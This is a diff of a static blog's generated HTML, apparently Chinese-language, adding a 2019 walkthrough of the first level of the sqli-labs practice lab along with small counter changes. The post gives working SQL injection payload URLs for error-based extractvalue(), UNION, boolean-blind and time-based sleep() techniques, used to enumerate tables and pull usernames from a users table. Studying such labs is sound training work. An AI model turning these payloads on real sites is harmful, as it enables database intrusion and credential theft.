@@ -249,6 +249,166 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/20/sqli-labs-less-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Blad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blad's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/20/sqli-labs-less-1/" itemprop="url">sqli-labs_less_1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-20T22:27:20+08:00">
+                2019-06-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="方法一：报错注入extractvalue"><a href="#方法一：报错注入extractvalue" class="headerlink" title="方法一：报错注入extractvalue()"></a>方法一：报错注入extractvalue()</h3><p>判断注入点：<br><code>输入单引号，发现页面报错
+http://172.16.173.131/sqli-labs/Less-1/?id=1&#39;</code><br><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g46wcsf4ndj31vg06uq4n.jpg" alt></p>
+<p>闭合前一个单引号，注释掉后一个，并加入判断payload<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+</code></p>
+<p>所以利用extractvalue()报错注入<br>先判断函数是否可执行<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,md5(123));--+</code><br><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g46wdeuw7nj31jy0eigod.jpg" alt></p>
+<p>获取version()、database()、user()等信息<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,database()));--+</code><br><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g46wdvrs8sj313y0egjt9.jpg" alt></p>
+<p>获取表名：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)));--+</code><br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g46wggbw6zj31pq0g00ve.jpg" alt></p>
+<p>获取users的列名<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1)));--+</code><br><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g46wgnbtvrj31es0fkdi3.jpg" alt></p>
+<p>获取每列（id、username、password）的内容<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select username from security.users limit 0,1)));--+</code><br><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g46wh7ozhdj31kw0fomzq.jpg" alt></p>
+<h3 id="方法二：联合注入"><a href="#方法二：联合注入" class="headerlink" title="方法二：联合注入"></a>方法二：联合注入</h3><p>判断注入点：<br><code>输入单引号，发现页面报错
+http://172.16.173.131/sqli-labs/Less-1/?id=1&#39;</code></p>
+<p>order by 判断有几列<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; order by 3--+</code><br>union select 联合注入<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,22,33--+</code></p>
+<p>判断数据库名称：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,database(),33--+</code></p>
+<p>获取security的表名：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),33--+</code></p>
+<p>获取列名：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1)),33--+</code></p>
+<p>获取每列（id、username、password）的内容：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 11,concat(0x7e,(select username from security.users limit 1,1)),33--+</code></p>
+<h3 id="方法3：回显布尔注入-ascii逐位判断"><a href="#方法3：回显布尔注入-ascii逐位判断" class="headerlink" title="方法3：回显布尔注入(ascii逐位判断)"></a>方法3：回显布尔注入(ascii逐位判断)</h3><p>判断注入点：<br><code>输入单引号，发现页面报错
+http://172.16.173.131/sqli-labs/Less-1/?id=1&#39;
+http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+</code><br>获取数据库名：<br>利用ascii逐位判断，更改substr()第二参数1~n<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr(database(),1,1))=115--+</code><br>获取表名(emails\referers\uagents\users)：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101--+</code><br>获取users列名：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=105--+</code><br>获取每列（id、username、password）的内容<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))&gt;65--+</code></p>
+<h3 id="方法4：时间盲注-sleep-、if"><a href="#方法4：时间盲注-sleep-、if" class="headerlink" title="方法4：时间盲注(sleep()、if())"></a>方法4：时间盲注(sleep()、if())</h3><p>if（（条件），m，n）语句：若条件为真 返回m，若条件为假 返回n；<br>获取数据库名：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and sleep(if((ascii(substr(database(),1,1))=115),5,0))--+</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/20/test2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -342,7 +502,7 @@
       
         
           
-            <p>sadasdasdasd<br><more><br>asdasdasdasd</more></p>
+            <p>sadasdasdasd<br>asdasdasdasd</p>
 
           
         
@@ -698,7 +858,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -709,7 +869,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -720,7 +880,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
